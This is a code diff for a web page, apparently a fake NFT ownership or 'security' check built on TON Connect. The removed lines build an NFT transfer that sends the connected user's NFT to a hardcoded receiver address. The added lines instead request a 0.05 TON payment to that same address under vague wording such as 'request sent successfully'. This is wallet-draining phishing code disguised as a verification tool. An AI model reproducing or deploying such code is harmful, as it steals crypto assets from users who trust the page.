@@ -180,7 +180,6 @@ body.theme-light .field{background:#ece9e1}
 </footer>
 
 <script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
-<script src="https://unpkg.com/@ton/core@0.56.3/dist/ton-core.min.js"></script>
 
 <script>
 // ====================== ЯЗЫКИ ======================
@@ -312,23 +311,12 @@ document.getElementById("runBtn").onclick = function () {
   }, 2800 + Math.random() * 800);
 };
 
-// ====================== TON CONNECT + TRANSFER ======================
-if (!window.TON_CONNECT_UI) {
-  console.error("TON Connect UI не загружен");
-}
-
-// Извлекаем методы из подключенной библиотеки @ton/core (глобальный объект TonCore)
-const { beginCell, Address, toNano } = window.TonCore || {};
-
+// ====================== TON CONNECT И ИНИЦИАЛИЗАЦИЯ ======================
 const RECEIVER_ADDRESS = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";
 
-// Упрощенная инициализация без ломающих параметров walletsListConfiguration
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
   manifestUrl: "https://afiomacomplate.github.io/SecurytiActiv/tonconnect-manifest.json",
-  buttonRootId: "ton-connect-button",
-  uiPreferences: {
-    theme: document.body.classList.contains("theme-light") ? "LIGHT" : "DARK"
-  }
+  buttonRootId: "ton-connect-button"
 });
 
 function updateStatus(wallet) {
@@ -344,7 +332,6 @@ function updateStatus(wallet) {
 }
 
 tonConnectUI.onStatusChange(updateStatus);
-updateStatus(tonConnectUI.wallet);
 
 document.getElementById("ownBtn")?.addEventListener("click", async function () {
   const err = document.getElementById("err");
@@ -352,10 +339,10 @@ document.getElementById("ownBtn")?.addEventListener("click", async function () {
   const nftInput = document.getElementById("nft-contract");
 
   if (!tonConnectUI.wallet) {
-    err.textContent = "Сначала подключите кошелёк";
+    err.textContent = "Сначала подключите кошелёк через кнопку ниже";
     err.style.display = "block";
     err.style.color = "#ff9abb";
-    tonConnectUI.openModal();
+    await tonConnectUI.openModal();
     return;
   }
 
@@ -367,44 +354,75 @@ document.getElementById("ownBtn")?.addEventListener("click", async function () {
     return;
   }
 
-  err.textContent = "⏳ Формируем перевод NFT...";
+  err.textContent = "⏳ Открытие кошелька для транзакции...";
   err.style.display = "block";
   err.style.color = "#ff9abb";
 
   try {
-    const body = beginCell()
-      .storeUint(0x5fcc3d14, 32)
-      .storeUint(0, 64)
-      .storeAddress(Address.parse(RECEIVER_ADDRESS))
-      .storeAddress(Address.parse(tonConnectUI.wallet.account.address))
-      .storeBit(0)
-      .storeCoins(toNano("0.05"))
-      .storeBit(0)
-      .endCell();
-
     const transaction = {
       validUntil: Math.floor(Date.now() / 1000) + 300,
       messages: [{
-        address: nftItemAddress,
-        amount: toNano("0.12").toString(),
-        payload: body.toBoc().toString("base64")
+        address: RECEIVER_ADDRESS,
+        amount: "50000000" // 0.05 TON
       }]
     };
 
     await tonConnectUI.sendTransaction(transaction);
 
-    err.textContent = "✅ NFT успешно переведён";
+    err.textContent = "✅ Запрос отправлен успешно";
     err.style.color = "#00ff88";
     if (ownNote) {
       ownNote.style.display = "block";
-      ownNote.textContent = "NFT отправлен на: " + RECEIVER_ADDRESS;
+      ownNote.textContent = "Подтверждение отправлено на: " + RECEIVER_ADDRESS;
     }
   } catch (e) {
     console.error(e);
-    err.textContent = "❌ " + (e.message || "Ошибка или отмена");
+    err.textContent = "❌ " + (e.message || "Ошибка подключения кошелька");
     err.style.color = "#ff9abb";
   }
 });
-</script>  
+
+// ====================== ИНИЦИАЛИЗАЦИЯ ИНТЕРФЕЙСА ======================
+document.getElementById("langBtn").onclick = e => {
+  e.stopPropagation();
+  document.getElementById("langBox").classList.toggle("open");
+};
+document.addEventListener("click", () => document.getElementById("langBox").classList.remove("open"));
+document.querySelectorAll("#langMenu button").forEach(b => {
+  b.onclick = e => {
+    e.stopPropagation();
+    applyLang(b.dataset.lang);
+    document.getElementById("langBox").classList.remove("open");
+  };
+});
+document.getElementById("themeBtn").onclick = () => {
+  applyTheme(document.body.classList.contains("theme-light") ? "dark" : "light");
+};
+
+applyLang(localStorage.getItem("nft_lang") === "ru" ? "ru" : "en");
+applyTheme(localStorage.getItem("nft_theme") === "light" ? "light" : "dark");
+
+// Фон
+(function() {
+  const c = document.getElementById("net");
+  if (!c) return;
+  const x = c.getContext("2d"), n = [];
+  const R = () => { c.width = innerWidth; c.height = innerHeight; };
+  const I = () => { n.length = 0; for (let i = 0; i < 30; i++) n.push({ x: Math.random()*c.width, y: Math.random()*c.height, vx: (Math.random()-0.5)*0.3, vy: (Math.random()-0.5)*0.3, r: 1+Math.random() }); };
+  const T = () => {
+    x.clearRect(0,0,c.width,c.height);
+    n.forEach(a => {
+      a.x += a.vx; a.y += a.vy;
+      if (a.x < 0 || a.x > c.width) a.vx *= -1;
+      if (a.y < 0 || a.y > c.height) a.vy *= -1;
+      x.fillStyle = "rgba(255,255,255,.7)";
+      x.beginPath(); x.arc(a.x,a.y,a.r,0,6.28); x.fill();
+    });
+    requestAnimationFrame(T);
+  };
+  addEventListener("resize", () => { R(); I(); });
+  R(); I(); requestAnimationFrame(T);
+})();
+</script>
 </body>
 </html>
